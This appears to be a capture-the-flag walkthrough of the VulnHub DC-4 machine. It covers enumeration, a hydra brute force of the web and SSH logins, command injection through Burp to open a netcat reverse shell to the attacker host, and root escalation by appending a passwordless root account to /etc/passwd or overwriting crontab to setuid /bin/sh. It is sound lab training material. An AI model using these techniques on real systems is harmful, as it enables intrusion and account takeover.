# DC: 4
[VulnHub link](https://www.vulnhub.com/entry/dc-4,313/)  
By DCAU

* Note: On some occasions below, the IP address might not match because this machine was revisited after some time.

## Enumeration ##
* As with the first 3 iterations of the DC-series, we are first greeted with a login page that requires users to specify both the username and the password:
![](/screenshots/dc-4/loginInitial.jpg)
* Common login credentials such as `admin:admin` and `admin:password` do not work.
* Run `nmap 10.0.2.*`, where we find 5 live hosts:
![](/screenshots/dc-4/nmapScan.jpg)
* After eliminating our own IP address and our router gateway IP address, it is very likely that the vulnerable VM's IP address is `10.0.2.10`.
* The host is running 2 services, SSH at port 22 and HTTP at port 80. Both ports are found to be open.
* Run `nmap -p- -A 10.0.2.10`:
![](/screenshots/dc-4/hostFullScan.jpg)
* Opening `http://10.0.2.10` reveals a site with only an "Admin Information Systems Login":
* Looking at the services which the vulnerable VM is running, we can see an nginx web server running on port 80 (which is open). This is the first time that we have encountered a non-Apache web server - not that it makes any difference (I think?).
![](/screenshots/dc-4/siteWebServer.jpg)
* Common login credentials such as `admin:admin` and `admin:password` do not work. Moreover, an invalid login attempt does not result in any error messages being displayed. Instead, the 2 user input text fields are simply emptied. The page is also changed to `http://10.0.2.10/index.php`.
* The page source does not reveal anything of interest, and the robots.txt page does not exist (404 Not Found).
* The page is running on PHP - perhaps it could be a WordPress site? I tried to load `http://10.0.2.10/wp-login.php`, but was greeted with the message "No input file specified.". Hmm, interesting. It seems to be expecting a file at the login page?
* I attempted a `wpscan` command against the web server but it did not detect the site's CMS as WordPress.
* Running `whatweb -v 10.0.2.10` also did not tell us what CMS the site was on, except information that we had already known before (e.g. nginx version):
![](/screenshots/dc-4/whatweb.jpg)
* Note: `whatweb` is a web scanner that identifies technologies used by websites.
* Time to find out what other pages or directories that we can access from the site - I tried using `uniscan` but it only gave 2 results which renders the same login page that greeted us.
![](/screenshots/dc-4/uniscan.jpg)
* Using `dirbuster`, we did not find out much additional useful information - the only page with 200 OK is what we already know. The rest of the pages attempted lead to either a 403 Forbidden or 302 Redirect.
![](/screenshots/dc-4/dirbuster.jpg)
* Without making much of a headway, I decided that we will use a dictionary attack against the login page, using `hydra`. However, we have 3 options to choose for the login page - `/`, `/login.php` and `/index.php`. Which one should be used? It turns out that only one of them could be used for hydra: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.10 http-post-form '/login.php:username=^USER^&password=^PASS^:S=Logout'`:
![](/screenshots/dc-4/hydraAdmin.jpg)
* **Important to Understand**: It appears that a 'double login' was always required when interacting with the site through the browser: If I loaded `/login.php`, I would be 302 redirected to `/index.php`. Submitting a set of credentials on this page results in a POST request being made to `/login.php` with the credentials. The response contains the page that indicates a successful login actually:
![](/screenshots/dc-4/successResponseToPostRequest.jpg)
* However, the response has a HTTP status code of 302 response instead of 200 OK, resulting in a redirect that makes a GET request for `/index.php`. When `/index.php` is loaded for the second time here, we can simply leave the text fields empty, and pressing the `Submit` button results in a POST request to `/login.php` again. But this time, the response is a 200 OK.
* **Learning Point**: During my first run at this, I had troubles identifying which option to choose for the login page because I was observing and testing everything through the web browser interface alone (without touching even the Developer Tools). Using Burp Suite to intercept the requests when I had another run at this machine allowed me to truly understand what was happening (and what I should have done). I am not sure if the 'double login' was a misconfiguration or an intentional way to throw us off this challenge though - but I definitely did learn a lot from this.
* Another issue was that I did not know what to expect upon a successful log in, i.e. what strings to feed into hydra to let it know of a success case. I was trying out words such as Welcome, and instead of Logout, I was trying Log Out (with a whitespace) instead - silly me.
* **Learning Point**: Attempting a negative detection (i.e. finding out what strings would result in a negative result to tell hydra) got me tricked initially. I tried to use words such as "Submit" and "information" (because I found out that a successful login did not contain them), but they did not work because the response to the POST request did not contain them. **Just because I see them on the login page and not on the success page does not mean that they can be used as the negative detection strings.** The response to a POST request with invalid credentials actually contains very little words. There is a blank line in the HTML body - which actually shows the content from a successful login. Hence, negative detection would have been impossible (in my opinion here) - because the **entire response from a failed login is found in the response from a successful login**, when we compare it to the screenshot above.
![](/screenshots/dc-4/failedResponseToPostRequest.jpg)
* Note that we **also had to make a guess with the username** `admin` because an invalid login did not reveal to us if the attempted username even existed.

## After Logging In ##
* This is the page that greets us after logging in:
![](/screenshots/dc-4/adminLogin.jpg)
* Note: There are not a lot of words in the page, so your word/phrase that detects for a successful login in your `hydra` command must have been accurate. On hindsight, we simply had to 'hit' a word (as part of our guesses) that did not appear in the login page.
* Clicking on `Command` brings us to a list of 3 commands which we can run:
![](/screenshots/dc-4/systemToolsCommands.jpg)
* Running each of the command is equivalent to running the respective versions of the command in Unix:
![](/screenshots/dc-4/systemToolsCommandsExecution.jpg)
* Looking at the `ls -l` command that was executed, we see that the owner and group of all of the listed files and directories is `root`.
* Since we appear to be executing commands from a GUI, I am guessing that we would be able to post our own requests (i.e. commands).
* This is the first time that I am using Burp Suite - we have to first configure the Firefox browser's proxy settings under Network settings, and ensure that both the browser and the tool are using the same IP address (e.g. 127.0.0.1) and port (e.g. 8080) for the interception by Burp Suite to work.
* We will now capture and intercept the request when we execute `ls -l`:
![](/screenshots/dc-4/burpSuitels.jpg)
* We see that the `ls -l` command is sent under the `radio` parameter.
* Since we are intercepting the request, let us now modify the command string to confirm the fact that we are actually sending commands to the web server. I have changed it to `pwd`, before pressing `Forward` to find out what our current working directory is:
![](/screenshots/dc-4/burpSuitepwd.jpg)
* So indeed it appears that we are able to send our own commands! We are currently at `/usr/share/nginx/html`.
* We will attempt to get a reverse shell through a connection using `nc 10.0.2.15 1234 -e /bin/sh` on the web server, and `nc -v -l -p 1234` in our own Kali VM terminal to catch the connection:
![](/screenshots/dc-4/burpSuitenc.jpg)
* Note: `10.0.2.15` is my Kali VM's IP address. Use `ifconfig` to find out yours.

## After Gaining Reverse Shell ##
* `whoami` reveals that we are `www-data` as expected.
* Run `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell.
* Next, I ran `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we could possibly exploit, but nothing quite stood out to me:
![](/screenshots/dc-4/setuidBinaries.jpg)
* I looked into the `/etc/passwd` to find out if there was useful information that we could extract, and found that there were 3 users that we did not know before (`charles`, `jim` and `sam`):
![](/screenshots/dc-4/etcPasswdUserList.jpg)
* Heading to the `/home` directory, we found 3 directories belonging to these users respectively:
![](/screenshots/dc-4/homeDirectory.jpg)
* There is not much that is of interest to us in the respective directories as shown:
![](/screenshots/dc-4/homeDirectoryContents.jpg)
* `test.sh` seems cryptic:
![](/screenshots/dc-4/testScript.jpg)
* The only other file that caught my attention is `old-passwords.bak`, which has a wordlist of 252 lines:
![](/screenshots/dc-4/oldPasswords.jpg)
* The wordlist could contain the password to user `jim`, since it was found under his directory.
* We will next attempt a dictionary attack on the 3 users with `hydra` once again. I used Burp Suite to download the wordlist by changing the request parameters to `radio=cat /home/jim/backups/old-passwords.bak&submit=Run`:
![](/screenshots/dc-4/oldPasswordsBak.jpg)
* Run `hydra -L users.txt -P passwords.txt 10.0.2.10 ssh`, where we see that a set of credentials belonging to `jim` has been found:
![](/screenshots/dc-4/hydraJim.jpg)
* Note: `users.txt` consist of charles, jim and sam, while `passwords.txt` contains the wordlist from `old-passwords.bak`. Since we are finding the credentials for ssh, including it in the command will simply do the trick.
* The password `jibril04` was found towards the end of the user list, hence it took awhile for `hydra` to give us our result.

## SSH as Jim ##
* We log in with `jim:jibril04`, running `ssh jim@10.0.2.10`, and we are in:
![](/screenshots/dc-4/sshJim.jpg)
* There was a file mbox that we did not have permissions to open previously:
![](/screenshots/dc-4/jimmbox.jpg)
* The file contains an email from `root` to `jim`, with a test message. I was pretty much stuck at this point in time because I was not quite sure what the mail was telling us. I did not find any information from the mail itself that appeared useful.
* I found out from other walkthroughs that we should check out `/var/mail`, because a mail server is likely to be (or had been) running given that an email was sent. Interesting, I have learnt something new here.
* There is only 1 file `jim` in the directory. Opening it, we see the password for user `charles` in an email sent from him:
![](/screenshots/dc-4/jimMail.jpg)

## SSH as Charles ##
* Now we have one more set of credentials: `charles:^xHhA&hvim0y`.
* We can either exit from `jim` and enter `ssh charles@10.0.2.10`, or continue with `jim` and run `su charles`:
![](/screenshots/dc-4/sshCharles.jpg)
* There are no noteworthy files in charles' home directory, so we will have to think of a way to escalate our privileges.
* I recalled in dc-2 that besides the command that we used earlier to find setuid binaries (but to no avail), we could also run `sudo -l` to find out what commands we can run as root in the current capacity:
![](/screenshots/dc-4/sudoCommands.jpg)
* It turns out that we can run `/usr/bin/teehee` as root.
* The confusion that I had was that I did not know exactly what `teehee` did. I ran the file and found that whatever I typed was repeated back to me. I typed in various commands but to no avail.
* I ran `strings teehee` and found a whole lot of text within the file. I had also found that we could run `./teehee --help` to find out what it was exactly doing:
![](/screenshots/dc-4/teeheeHelp.jpg)

## Privilege Escalation Method 1 (Edit password file using teehee) ##
* After digesting what it all meant, I ran `sudo teehee -a /etc/passwd`, before entering `fakeroot::0:0:::/bin/bash`, and then terminating the program.
![](/screenshots/dc-4/addRootAccount.jpg)
* The idea here was to make use of the ability of teehee to **append to any file**, and then add our own account (fakeroot in this case) with root privileges to `/etc/passwd`. The entry that I added was crafted with reference to root's entry. Essentially, no password is needed to access the account, and it will run `/bin/bash` upon login.
* Note: There are other methods to use teehee and escalate our privileges, 
* Run `su fakeroot` and volia, we have our root privileges:
![](/screenshots/dc-4/suFakeRoot.jpg)
* Note: Exiting as user charles and running `ssh fakeroot@10.0.2.10` still requires a password. I pressed the Enter key with entering any password, but to no avail. **Why is a password still required?**
* Opening up `flag.txt`, we have come to the end of this challenge!
![](/screenshots/dc-4/flag.jpg)

## Privilege Escalation Method 2 (Edit cron jobs using teehee) ##
* Credits goes to [s1gh](https://s1gh.sh/vulnhub-dc-4/). I did not quite understand it at first, probably because due to my lack of knowledge in how teehee had worked, as well as his use of symbolic links in Unix which taught me a great deal as well.
* We see from `/etc/crontab` the list of commands that are executed at a specified frequency.
![](/screenshots/dc-4/crontab.jpg)
* The idea is that we will insert our choice of command into crontab through `teehee`, since we currently do not have write permissions to the file.
* Run `sudo teehee /etc/crontab`, and then `* * * * * root chmod 4777 /bin/sh`. We do not use the append option of teehee because the file ends with a # character, which means that whatever that is appended to it is treated as a comment, and will not be executed. Without specifying any options, it means that we are **replacing the entire file's contents with our one-liner here**.
* The entry placed into the crontab file means that universal permissions are given for /bin/sh, and that the cron job is executed every minute:
![](/screenshots/dc-4/binShUniversal.jpg)
* Next, simply run `/bin/sh`, and we are now `root`!
![](/screenshots/dc-4/euidRoot.jpg)
* Note: `s1gh` pointed out something which I did not know beforehand - that if `/bin/sh` is symbolically linked to `/bin/bash` then our second method will not work. This is because `bash` automatically drops setuid privileges. In this case, it is symbolically linked to `/bin/dash`, which does not drop setuid privileges.

# Concluding Remarks
Despite the fact that this is the fourth challenge in the DC-series, the author @DCAU7 has made each challenge unique in its own rights. As usual, I have learnt tons!
1. Learnt how to use Burp Suite to intercept and modify requests, especially in cases where the interaction with the web server is puzzling.
2. Had more practice on using `hydra` (which I definitely needed).
3. Learnt about `/var/mail` which is related to mail servers.
4. Learnt to get root privileges without having to eventually log in as `root`.
5. Reinforced previous concepts and methods such as `sudo -l`.
6. Learnt how `/etc/crontab` functions.

# References
1. https://s1gh.sh/vulnhub-dc-4/
2. https://www.hackingarticles.in/dc-4-vulnhub-walkthrough/